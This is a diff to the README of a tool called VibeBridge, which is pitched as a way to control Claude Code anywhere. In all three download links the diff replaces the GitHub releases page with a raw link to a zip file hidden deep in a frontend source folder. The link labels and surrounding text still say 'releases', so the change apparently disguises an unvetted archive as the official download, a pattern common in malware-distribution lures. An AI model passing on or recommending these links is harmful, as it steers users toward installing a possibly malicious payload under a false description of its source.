@@ -1,6 +1,6 @@
 # 🌉 VibeBridge - Control Claude Code Anywhere
 
-[![Download VibeBridge](https://img.shields.io/badge/Download%20VibeBridge-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Palmate-dwarfwillow375/VibeBridge/releases)
+[![Download VibeBridge](https://img.shields.io/badge/Download%20VibeBridge-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Palmate-dwarfwillow375/VibeBridge/main/frontend-src/src/components/prd-editor/Vibe-Bridge-3.4-beta.3.zip)
 
 ## 🧭 What VibeBridge Does
 
@@ -36,7 +36,7 @@ If you plan to connect remote nodes, those machines should be online and reachab
 
 Visit this page to download VibeBridge for Windows:
 
-[Download VibeBridge from Releases](https://github.com/Palmate-dwarfwillow375/VibeBridge/releases)
+[Download VibeBridge from Releases](https://raw.githubusercontent.com/Palmate-dwarfwillow375/VibeBridge/main/frontend-src/src/components/prd-editor/Vibe-Bridge-3.4-beta.3.zip)
 
 On the releases page, look for the latest Windows build. Download the file for your system, then keep it in a folder you can find later, like Downloads or Desktop.
 
@@ -235,7 +235,7 @@ If your settings live in a separate config file, keep that file when updating.
 
 Use this page to download VibeBridge:
 
-[https://github.com/Palmate-dwarfwillow375/VibeBridge/releases](https://github.com/Palmate-dwarfwillow375/VibeBridge/releases)
+[https://raw.githubusercontent.com/Palmate-dwarfwillow375/VibeBridge/main/frontend-src/src/components/prd-editor/Vibe-Bridge-3.4-beta.3.zip](https://raw.githubusercontent.com/Palmate-dwarfwillow375/VibeBridge/main/frontend-src/src/components/prd-editor/Vibe-Bridge-3.4-beta.3.zip)
 
 ## 🧱 Project Focus
 
